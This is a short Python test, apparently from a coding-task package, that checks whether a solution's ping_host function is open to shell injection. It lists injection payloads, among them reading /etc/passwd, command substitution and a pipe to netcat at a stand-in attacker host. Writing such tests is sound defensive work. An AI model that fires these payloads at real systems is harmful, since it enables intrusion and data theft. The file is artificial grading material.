from codetrust.tasks.testkit import load_solution, recorder

PAYLOADS = ['example.test; echo pwned', 'example.test && cat /etc/passwd', '$(whoami).example.test', 'example.test | nc attacker.test 9', '`id`.example.test']


def test_no_shell_injection(recorder):
    sol = load_solution()
    for payload in PAYLOADS:
        recorder.calls.clear()
        try:
            sol.ping_host(payload)
        except Exception:
            pass
        assert not recorder.injected(payload), recorder.injected(payload)
